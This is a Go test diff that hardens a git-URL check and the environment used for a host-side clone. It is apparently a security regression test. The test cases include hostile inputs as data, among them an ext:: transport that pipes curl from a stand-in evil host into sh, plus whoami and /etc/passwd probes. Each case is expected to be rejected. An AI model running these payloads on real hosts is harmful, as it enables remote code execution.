@@ -24,12 +24,24 @@ func TestIsGitURL(t *testing.T) {
 		{"git://example.com/repo", true},
 		{"ssh://git@example.com/repo.git", true},
 		{"git@github.com:foo/bar.git", true},
-		{"repo.git", true},
 		{"./local/path", false},
 		{"/abs/local/path", false},
 		{"../relative", false},
 		{"some-dir", false},
 		{"", false},
+		// A bare ".git" suffix with NO accepted scheme must NOT be treated as a
+		// clone target: it falls through to the safe local-path branch. This is
+		// what closes the "ext:: transport smuggled behind a .git suffix" hole.
+		{"repo.git", false},
+		// git's command-executing transports must never be admitted, even when
+		// crafted to end in ".git" (the old ".git"-suffix rule let these through,
+		// and "git clone" would then run the payload on the host).
+		{"ext::sh -c 'curl -s https://evil.sh | sh' .git", false},
+		{"ext::sh -c whoami", false},
+		{"file:///etc/passwd", false},
+		{"fd::17/foo.git", false},
+		// A "git@" string with no ":path" separator is not a valid scp-like URL.
+		{"git@github.com", false},
 	}
 	for _, tt := range tests {
 		t.Run(tt.source, func(t *testing.T) {
@@ -37,6 +49,61 @@ func TestIsGitURL(t *testing.T) {
 				t.Errorf("isGitURL(%q) = %v, want %v", tt.source, got, tt.want)
 			}
 		})
+	}
+}
+
+// fakeGitBin writes an executable `git` stub to a temp dir, prepends that dir to
+// PATH for the duration of the test, and returns the path of a record file the
+// stub dumps its environment into. It lets a test observe exactly what env
+// resolveRepo hands `git clone` without a real remote or network.
+func fakeGitBin(t *testing.T) (recordFile string) {
+	t.Helper()
+	dir := t.TempDir()
+	recordFile = filepath.Join(dir, "git-env.log")
+	// The stub must be named exactly "git" so it shadows the real git on PATH.
+	// It dumps its whole environment to recordFile and exits 0 so the clone is
+	// reported as successful (resolveRepo only checks the exit status).
+	script := "#!/bin/sh\nenv > " + recordFile + "\nexit 0\n"
+	if err := os.WriteFile(filepath.Join(dir, "git"), []byte(script), 0o755); err != nil {
+		t.Fatalf("write fake git: %v", err)
+	}
+	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
+	return recordFile
+}
+
+// TestResolveRepoCloneHardening is the regression guard for decision 0027: the
+// host-side clone must lock git to safe transports so a crafted `ext::`/`file::`
+// URL cannot execute a command on the host. It asserts resolveRepo runs `git
+// clone` with GIT_ALLOW_PROTOCOL restricted to the four network transports and
+// GIT_PROTOCOL_FROM_USER=0. Without these, an attacker-controlled source is one
+// git default away from host code execution (invariant 1).
+func TestResolveRepoCloneHardening(t *testing.T) {
+	recordFile := fakeGitBin(t)
+
+	dir, owned, cleanup, err := resolveRepo(context.Background(), "https://example.com/foo/bar.git", io.Discard)
+	if err != nil {
+		t.Fatalf("resolveRepo error: %v", err)
+	}
+	defer cleanup()
+	if !owned {
+		t.Errorf("owned = false for a cloned repo, want true")
+	}
+	if dir == "" {
+		t.Fatal("resolveRepo returned an empty dir for a successful clone")
+	}
+
+	data, readErr := os.ReadFile(recordFile)
+	if readErr != nil {
+		t.Fatalf("fake git did not run (no env recorded): %v", readErr)
+	}
+	env := string(data)
+	for _, want := range []string{
+		"GIT_ALLOW_PROTOCOL=http:https:git:ssh",
+		"GIT_PROTOCOL_FROM_USER=0",
+	} {
+		if !strings.Contains(env, want) {
+			t.Errorf("clone env missing %q (transport hardening removed?)\n  got:\n%s", want, env)
+		}
 	}
 }
 
